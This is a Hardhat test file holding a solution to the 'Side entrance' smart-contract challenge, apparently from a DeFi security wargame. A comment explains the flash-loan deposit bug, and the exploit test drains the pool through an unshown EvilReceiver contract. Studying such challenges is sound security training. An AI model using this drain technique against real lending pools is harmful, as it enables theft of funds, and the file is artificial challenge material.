const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] Side entrance', function () {

    let deployer, attacker;

    const ETHER_IN_POOL = ethers.utils.parseEther('1000');

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [deployer, attacker] = await ethers.getSigners();

        const SideEntranceLenderPoolFactory = await ethers.getContractFactory('SideEntranceLenderPool', deployer);
        this.pool = await SideEntranceLenderPoolFactory.deploy();
        
        await this.pool.deposit({ value: ETHER_IN_POOL });

        this.attackerInitialEthBalance = await ethers.provider.getBalance(attacker.address);

        console.log("attacker init balance:", ethers.utils.formatUnits(this.attackerInitialEthBalance, 18));
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.equal(ETHER_IN_POOL);
    });

    /**
     * Goal: Steal all ether from lending pool
     * Bug: Pool does not check the deposit amount of borrower before and after flash loan. 
     * Solution: borrow flash loan and deposit back to the pool, then withdraw all of them.
     */
    it('Exploit', async function () {
        const factory = await ethers.getContractFactory('EvilReceiver', attacker);
        const receiver = await factory.deploy(this.pool.address);
        
        await receiver.connect(attacker).executeFlashLoan();
        await receiver.connect(attacker).withdraw();
    
        console.log("attacker final balance:", ethers.utils.formatUnits(await ethers.provider.getBalance(attacker.address), 18));

    });

    after(async function () {
        /** SUCCESS CONDITIONS */
        expect(
            await ethers.provider.getBalance(this.pool.address)
        ).to.be.equal('0');
        
        // Not checking exactly how much is the final balance of the attacker,
        // because it'll depend on how much gas the attacker spends in the attack
        // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.be.gt(this.attackerInitialEthBalance);
    });
});
